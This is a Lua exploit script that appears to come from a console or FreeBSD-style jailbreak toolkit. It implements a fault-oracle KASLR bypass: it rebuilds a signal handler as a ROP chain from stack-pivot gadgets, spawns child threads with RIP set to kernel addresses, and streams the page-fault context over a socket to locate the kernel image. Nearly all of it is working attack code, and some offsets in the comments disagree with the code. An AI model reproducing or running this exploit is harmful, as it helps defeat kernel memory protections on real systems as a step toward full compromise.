-- CRASH_CLASS: HIGH
-- PROBE 1199a: fault oracle KASLR scanner
--
-- Context: ng643 proved (PR #183) that the x86 #PF error code from the loader's
-- signal handler discriminates mapped (supervisor) from unmapped kernel pages.
-- A thr_create(430) child with RIP = kernel VA faults immediately; a rebuilt
-- signal handler chain writes the mcontext to the socket and calls thr_exit(431)
-- to end the child cleanly. The parent survives and can probe many addresses.
--
-- The discriminator is at mcontext + 0xF0 (ctx+0x130 in the fault report):
--   (value >> 8) & 0xF == 5  →  page present (mapped, supervisor)
--   (value >> 8) & 0xF == 4  →  not present (unmapped)
--
-- Sweep: 0xFFFFFFFF_80000000 to 0xFFFFFFFF_BFFFFFFF at 2 MB steps = 512 probes
-- Expected: ~49 consecutive present pages (98 MB kernel image, 2 MB aligned)
-- Sleep between probes: 60 ms (512 * 60 ms ≈ 31 seconds total)

print("=== PROBE 1199a: FAULT ORACLE KASLR SCAN ===")
print("")

local BASE  = 0xFFFFFFFF80000000
local STEP  = 0x200000            -- 2 MB
local COUNT = 512
local SLEEP_US = 60 * 1000       -- 60 ms in microseconds

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(v) or 0
end

local function mk(n)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local function as_addr(t)
    local s = tostring(t)
    local m = s:match("0x(%x+)")
    if m then return tonumber(m, 16) end
    return to_num(t)
end

local function wq(a, v)
    pcall(function() memory.write_qword(uint64(a), uint64(v)) end)
end

local function rd(a)
    local ok, val = pcall(function() return memory.read_dword(uint64(a)) end)
    if ok then return to_num(val) end
    return nil
end

-- ========== Step 0: read loader state ==========
local fd = rd(signal.fd_addr) or 0
local pid = to_num(mk(20)())
print(string.format("[0] pid=%u fd=%u base=0x%X step=0x%X count=%u",
    pid, fd, BASE, STEP, COUNT))

if fd == 0 then
    print("[!] fd=0 — signal.fd_addr not set. Aborting.")
    print("=== ABORT ===")
    return
end

-- ========== Step 1: rebuild signal handler chain ==========
-- Replace the default chain (which restores execution) with one that:
--   1. Stores RDX (ucontext pointer) into memory
--   2. Writes 0x100 bytes from ucontext+0x40 (mcontext) to the socket
--   3. Calls thr_exit(431) to end the child thread

local ph = gadgets.stack_pivot[1]
local ctxt = memory.alloc(8)

local chain = ropchain({
    stack_base = to_num(ph.pivot_addr)
})

-- Save RDX = pointer to ucontext struct passed by kernel to signal handler
chain:push_store_rdx_into_memory(ctxt)

-- Write 0x100 bytes from ucontext+0xC0 to client socket
-- syscall 4 = write(fd, buf, len)
-- NOTE: push_set_reg_from_rax clobbers rdi, so fd must load LAST
chain:push_syscall_raw(mk(4), function()
    chain:push_set_rdx(0x100)
    chain:push_set_rax_from_memory(ctxt)
    chain:push_add_to_rax(0xC0)
    chain:push_set_reg_from_rax("rsi")
    chain:push_set_reg_from_memory("rdi", signal.fd_addr)
end)

-- thr_exit(0) — kill child thread, parent survives
chain:push_syscall_raw(mk(431), function()
    chain:push_set_rdi(0)
end)

print("[1] chain rebuilt: write 0x100 from ctx+0xC0, then thr_exit(431)")

-- ========== Step 2: allocate child resources ==========
local page = 0x4000
local function mmap(sz)
    local ok2, a = pcall(function()
        return mk(477)(uint64(0), uint64(sz), uint64(3),
                       uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    local v = to_num(a)
    if v ~= 0 and v < 0x800000000000 then
        for o = 0, sz - 8, 8 do wq(v + o, 0) end
    end
    return v
end

local Ctx = {
    MAGIC = 0x108, TYPE = 0x110,
    CS = 0x0C0, RIP = 0x0E0, RSP = 0x0F8, SS = 0x100
}

local block = mmap(page * 4)           -- 64 KB for child stack
local start = block + page * 4 - 0x200 -- child RSP near top
local ctx = memory.alloc(0x500)        -- ucontext buffer
local ctxa = as_addr(ctx)
local tb = memory.alloc(8)             -- tid output buffer
local ts = memory.alloc(16)            -- timespec for nanosleep

print(string.format("[2] block=0x%X start=0x%X ctx=0x%X", block, start, ctxa))

-- ========== Step 3: sweep kernel VA ==========
local spawned, failed = 0, 0

for i = 0, COUNT - 1 do
    local target_hi = 0xFFFFFFFF
    local target_lo = 0x80000000 + i * STEP

    -- Zero the ucontext
    for o = 0, 0x4F8, 8 do wq(ctxa + o, 0) end

    -- Set the gates
    wq(ctxa + Ctx.MAGIC, 0x480)
    wq(ctxa + Ctx.TYPE,  0x10000)
    wq(ctxa + Ctx.CS,    0x43)
    wq(ctxa + Ctx.SS,    0x3B)

    -- Set RIP = target kernel address (using uint64 for the full 64-bit value)
    pcall(function()
        memory.write_qword(uint64(ctxa + Ctx.RIP),
            uint64(string.format("0x%X%08X", target_hi, target_lo)))
    end)

    -- Set RSP = child stack
    wq(ctxa + Ctx.RSP, start)

    -- Clear tid buffer
    wq(as_addr(tb), 0)

    -- Print target header (text, before the binary blob)
    print(string.format("[T%03d] 0x%08X%08X", i, target_hi, target_lo))

    -- Spawn child thread
    local ok, rv = pcall(function()
        return mk(430)(uint64(ctxa), uint64(as_addr(tb)), uint64(0))
    end)

    if ok and to_num(rv) == 0 then
        spawned = spawned + 1
    else
        failed = failed + 1
    end

    -- Sleep to let the child fault + handler write + thr_exit
    wq(as_addr(ts), 0)
    wq(as_addr(ts) + 8, SLEEP_US * 1000)  -- nanoseconds
    pcall(function() mk(240)(uint64(as_addr(ts)), uint64(0)) end)
end

-- ========== Step 4: summary ==========
print(string.format("[E] spawned=%u failed=%u alive pid=%u",
    spawned, failed, to_num(mk(20)())))
print("=== COMPLETE ===")
